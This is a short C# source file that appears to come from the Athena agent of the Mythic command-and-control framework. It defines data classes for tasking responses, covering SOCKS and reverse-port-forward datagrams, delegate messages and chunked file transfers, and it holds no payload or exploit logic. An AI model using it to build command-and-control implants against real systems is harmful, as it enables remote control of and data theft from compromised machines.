using Athena.Models.Comms.SMB;
using Athena.Models.Proxy;
using System.Text.Json.Serialization;

namespace Athena.Models.Mythic.Tasks {

    public class GetTaskingResponse
    {
        public string action { get; set; }
        public List<MythicTask> tasks { get; set; }
        public List<MythicDatagram> socks { get; set; }
        public List<MythicDatagram> rpfwd { get; set; }
        public List<DelegateMessage> delegates { get; set; }
        public List<MythicResponseResult> responses { get; set; }
    }
    [Serializable]
    public class MythicResponseResult
    {
        public string task_id { get; set; }
        public string status { get; set; }
        public string file_id { get; set; }
        public int total_chunks { get; set; }
        public int chunk_num { get; set; }
        public string chunk_data { get; set; }
    }

    [JsonSerializable(typeof(GetTaskingResponse))]
    [JsonSerializable(typeof(string))]
    [JsonSerializable(typeof(int))]
    [JsonSerializable(typeof(bool))]
    //[JsonSerializable(typeof(MythicTask))]
    //[JsonSerializable(typeof(SocksMessage))]
    //[JsonSerializable(typeof(DelegateMessage))]
    //[JsonSerializable(typeof(MythicResponseResult))]
    public partial class GetTaskingResponseJsonContext : JsonSerializerContext
    {
    }
}
